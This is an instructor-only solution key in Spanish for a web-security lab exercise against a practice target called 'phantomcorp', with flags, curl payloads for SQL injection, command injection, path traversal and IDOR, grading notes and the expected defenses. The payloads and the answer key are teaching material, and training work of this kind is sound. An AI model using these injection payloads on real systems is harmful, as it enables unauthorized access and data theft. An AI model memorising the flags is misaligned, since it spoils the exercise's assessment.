# Solución — Laboratorio 07 (SOLO DOCENTE)

> No compartir con alumnos.

## Levantar
```bash
make setup && make lab N=07 && make shell
```

## Flags y payloads

| Reto | Flag | Payload (desde la consola) |
|---|---|---|
| R1 | `FLAG{sqli_auth_bypass}` | `curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin' -- " --data-urlencode "pass=x"` |
| R2 | `FLAG{sqli_union_dump}` | `curl -s -G http://phantomcorp/buscar --data-urlencode "q=' UNION SELECT clave,valor FROM secrets -- "` |
| R3 | `FLAG{command_injection_rce}` | `curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"` |
| R4 | `FLAG{path_traversal_lfi}` | `curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/lfi.txt"` |
| R5 | `FLAG{idor_broken_access}` | `curl -s "http://phantomcorp/perfil?id=1"` |

## Notas de corrección
- R1: la clave es el `--` que comenta el chequeo de `pass`. También sirve
  `user=' OR '1'='1' -- `.
- R2: dos columnas (productos tiene nombre, precio). Si el alumno no sabe cuántas,
  se descubre con `ORDER BY n` incrementando hasta el error.
- R3: cualquier separador de shell (`;`, `|`, `&&`) sirve. La app corre en /app.
- R4: `../` desde `public/`. Con `sqlmap` NO se resuelve R4/R5: son de análisis.
- R5: el perfil del alumno es id=3; el flag está en la nota_privada del admin (id=1).

## Defensas esperadas (para evaluar la tabla)
- SQLi → consultas parametrizadas (prepared statements). NO "escapar comillas".
- Command injection → evitar shell; usar APIs sin shell y lista blanca de hosts.
- Path traversal → normalizar la ruta y validar que quede dentro del dir permitido.
- IDOR → verificar en el servidor que el objeto pertenece al usuario autenticado.
